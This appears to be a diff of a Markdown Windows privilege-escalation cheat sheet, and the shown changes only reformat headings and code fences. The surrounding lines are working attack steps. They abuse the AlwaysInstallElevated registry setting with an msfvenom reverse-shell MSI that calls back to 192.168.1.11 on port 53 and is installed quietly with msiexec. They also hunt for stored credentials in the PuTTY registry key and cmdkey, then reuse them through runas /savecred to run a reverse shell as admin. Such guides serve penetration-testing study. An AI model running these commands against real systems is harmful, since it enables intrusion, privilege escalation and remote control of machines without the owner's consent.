@@ -68,8 +68,11 @@ if you are able to write to an AutoRun executable, and are able to restart the s
 // Alternatively, verify the values manually: (both should return 1)
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
 
-EXPLOITATION
+Exploitation
+
+```
 // Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
@@ -78,7 +81,6 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o 
 
 msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 ```
-
 ## Passwords Hunting
 
 ### Registries
@@ -96,10 +98,11 @@ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
 // We can verify this manually using the following command:
 cmdkey /list
 
-EXPLOITATION
+```
+Exploitation
+```
 //We can use the saved credential to run any command as the admin user. Start a listener on Kali and run the reverse shell executable:
 runas /savecred /user:admin C:\PrivEsc\reverse.exe
-
 ```
 ## Exploits
 
